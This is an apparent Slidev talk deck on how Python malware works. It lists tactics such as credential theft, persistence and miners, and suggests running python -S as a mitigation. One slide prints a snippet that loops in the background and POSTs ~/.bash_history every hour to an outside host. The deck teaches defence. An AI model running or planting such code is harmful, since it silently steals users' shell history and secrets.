



---
layout: center
class: text-center
---

<style scoped>
.slidev-layout {
  background-color: #2e1a1a;
  background-image: radial-gradient(rgba(255,255,255,0.05) 2px, transparent 2px);
  background-size: 48px 48px;
}
</style>


# Mechanisms of Python Malware

<div style="position:absolute;right:0%;bottom:-5%;font-size:450px !important;line-height:1 !important;opacity:0.03;pointer-events:none;filter:brightness(0.1) invert(1);">🔥</div>




---
class: malware
---

# Common Malware Tactics

<v-clicks depth=2>

- Reconnaissance
- Credential exfiltration (info-stealers)
  - SSH keys, AWS tokens, API keys
  - Environment variables, `.env` files
  - Clipboard extraction
- Data theft (source code, databases)
- Persistence (keyloggers, backdoors)
- Resource abuse (crypto miners, botnets)
- Ransomware, wipers

</v-clicks>



---
class: malware
---

# Exfiltrate Shell History Every Hour

```python {0|1-2|3|3-5}
import os
os.system('''nohup bash -c 'while true; do
curl -s -X POST -d @~/.bash_history https://doom.org/collect;
sleep 3600;
done' &''')
```



---
class: mitigation
---

# Mitigations: Avoiding `site.main()`

<v-clicks depth=2>

- Disable `site.main()`: `python -S`
- Manually add "site-packages" to `sys.path`
```bash
$ python -S
>>> import site, sys
>>> sys.path.extend(site.getsitepackages())
```

</v-clicks>






---
layout: center
class: text-center quote
---

<style scoped>
.slidev-layout {
  background-color: #0f0f1e;
  background-image: radial-gradient(ellipse 60% 50% at 50% 50%, rgba(60, 60, 110, 0.5) 0%, transparent 100%);
}
</style>

# The easiest way to get malware on your machine is to install it yourself
